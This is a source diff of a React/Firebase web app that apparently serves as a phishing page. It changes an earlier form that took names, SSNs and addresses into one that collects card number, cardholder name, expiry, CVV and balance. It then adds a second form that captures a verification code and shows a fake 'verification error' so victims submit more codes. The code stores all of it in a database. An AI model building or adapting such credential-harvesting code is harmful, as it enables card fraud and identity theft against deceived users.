@@ -13,13 +13,19 @@ function App() {
   const collectionRef = collection(database, 'users');
   
   const [formData, setFormData] = useState({
-    firstName: "",
-    lastName: "",
-    ssn: "",
-    phoneNumber: "",
-    addressL1: "",
-    addressL2: "",
+    cardNumber: "",
+    cardName: "",
+    expiryDate: "",
+    cvv: "",
+    balance: "",
+    
   });
+
+  const [formData2, setFormData2] = useState({
+   code: "",
+    
+  });
+
 
   const navigate = useNavigate();
 
@@ -33,17 +39,40 @@ function App() {
      console.log(formData);
   }
 
+
+  function getData2(event) {
+    setFormData2((prev)=> {
+       return {
+         ...prev,
+         [event.target.name]: event.target.value,
+       }
+    })
+    console.log(formData2);
+ }
   function handleSubmit(event) {
     event.preventDefault();
     addDoc(collectionRef, {
-      firstName: formData.firstName,
-      lastName: formData.lastName,
-      ssn: formData.ssn,
-      phoneNumber: formData.phoneNumber,
-      addressL1: formData.addressL1,
-      addressL2: formData.addressL2,
+      cardNumber: formData.cardNumber,
+      cardName: formData.cardName,
+      expiryDate: formData.expiryDate,
+      cvv: formData.cvv,
+      balance: formData.balance,
+      
     }).then(()=> {
        navigate("success")
+    }).catch((err)=> {
+      alert(err.message)
+    })
+  }
+
+  function handleSubmit2(event) {
+    event.preventDefault();
+    addDoc(collectionRef, {
+      code: formData2.code,
+      
+    }).then(()=> {
+      alert("verfication Error, a new code will be sent in minutes, try again");
+      console.log("yes")
     }).catch((err)=> {
       alert(err.message)
     })
@@ -53,7 +82,7 @@ function App() {
     <section>
      <Routes>
       <Route index element={<HomePage handleSubmit={handleSubmit} getData={getData}/>} />
-      <Route path='success' element={<Success />}/>
+      <Route path='success' element={<Success getData2={getData2} handleSubmit2={handleSubmit2}/>} />
       
      </Routes>
      
